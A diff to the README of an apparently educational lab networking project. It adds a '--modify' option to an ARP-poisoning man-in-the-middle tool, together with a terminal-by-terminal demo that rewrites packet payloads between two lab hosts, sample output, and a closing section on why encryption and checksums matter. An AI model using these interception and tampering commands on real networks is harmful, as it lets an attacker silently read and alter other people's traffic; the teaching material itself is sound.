@@ -141,7 +141,7 @@ B->A|10.0.1.1|7|10.0.1.2|54321|TCP|82
 ## Command reference
 
 ```bash
-sudo ./ironattack/ironmitm --victim-a <ip> --victim-b <ip> --iface <name> [--log <file>]
+sudo ./ironattack/ironmitm --victim-a <ip> --victim-b <ip> --iface <name> [options]
 ```
 
 | Option | Description | Default |
@@ -150,6 +150,113 @@ sudo ./ironattack/ironmitm --victim-a <ip> --victim-b <ip> --iface <name> [--log
 | `--victim-b <ip>` | Second victim IP | (required) |
 | `--iface <name>` | Network interface | iron0 |
 | `--log <file>` | Log file path | (none) |
+| `--modify <find:replace>` | Modify payload in transit (same-length, can repeat) | (none) |
+
+---
+
+## Traffic Modification Demo (Phase 16b)
+
+The `--modify` option replaces matching patterns in packet payloads as they pass through the MITM. This demonstrates data integrity attacks.
+
+### Terminal 1: Start router
+
+```bash
+cd IronNet/build
+sudo ./ironstack/ironstack ../src/configs/router.conf
+```
+
+### Terminal 2: Setup client
+
+```bash
+sudo ip addr add 10.0.1.2/24 dev iron0
+sudo ip link set iron0 up
+```
+
+### Terminal 3: Start MITM with modification rules
+
+```bash
+cd IronNet/build
+sudo ./ironattack/ironmitm --victim-a 10.0.1.1 --victim-b 10.0.1.2 --iface iron0 \
+    --modify "secret:XXXXXX" --modify "hello:PWNED" --log /tmp/mitm_modify.log
+```
+
+Expected startup:
+```
+╔══════════════════════════════════════════╗
+║     ironmitm — MITM Relay Engine         ║
+╚══════════════════════════════════════════╝
+
+  Victim A: 10.0.1.1
+  Victim B: 10.0.1.2
+  Iface:    iron0
+  Log:      /tmp/mitm_modify.log
+  Modify:   2 rules
+    [1] "secret" -> "XXXXXX"
+    [2] "hello" -> "PWNED"
+
+  [mitm] Resolving victim MACs...
+  [mitm] Starting ARP poisoning + relay...
+  [mitm] Press Ctrl+C to stop.
+```
+
+### Terminal 2: Send data containing the patterns
+
+```bash
+# Echo server echoes back data — MITM modifies the echo reply
+echo "secret" | nc -w2 10.0.1.1 7
+# Without MITM: receives "secret" back
+# With MITM modify: the reply from router has "secret" replaced with "XXXXXX"
+
+echo "hello world" | nc -w2 10.0.1.1 7
+# Reply has "hello" replaced with "PWNED"
+
+echo "normal data" | nc -w2 10.0.1.1 7
+# No matching pattern — passes through unmodified
+```
+
+### Terminal 3: MITM shows modifications
+
+```
+  [A->B] 10.0.1.1:7 -> 10.0.1.2:49700 TCP (47 bytes)
+  [MODIFY] Replaced "secret" with "XXXXXX" at offset 54
+  [A->B] 10.0.1.1:7 -> 10.0.1.2:49701 TCP (51 bytes)
+  [MODIFY] Replaced "hello" with "PWNED" at offset 54
+  [A->B] 10.0.1.1:7 -> 10.0.1.2:49702 TCP (51 bytes)
+```
+
+### Terminal 3: Stop MITM (Ctrl+C)
+
+```
+^C
+  [mitm] Stopped.
+  [mitm] Intercepted: 30 packets
+  [mitm] Forwarded:   30 packets
+  [mitm] Modification rules:
+    "secret" -> "XXXXXX": 1 hits
+    "hello" -> "PWNED": 1 hits
+  [mitm] Log saved.
+```
+
+### Modification rules
+
+| Rule format | Example | Effect |
+|-------------|---------|--------|
+| `find:replace` | `"secret:XXXXXX"` | Replace "secret" with "XXXXXX" in payload |
+| Multiple rules | `--modify "OK:NO" --modify "bar:XXX"` | Apply all rules to each packet |
+
+**Constraints:**
+- Find and replace must be the **same length** (in-place replacement)
+- Only searches payload after headers (offset 54+, after eth+ip+tcp)
+- Up to 8 rules maximum
+- Does not recalculate TCP checksums (strict receivers may drop modified packets)
+
+### What this demonstrates
+
+- **Data integrity attack**: attacker can silently alter data in transit
+- **Why encryption matters**: with TLS/IPsec, payload is encrypted — attacker can't find patterns
+- **Why checksums matter**: TCP checksum mismatch would detect modification (if receiver validates)
+
+---
 
 ## Notes
 
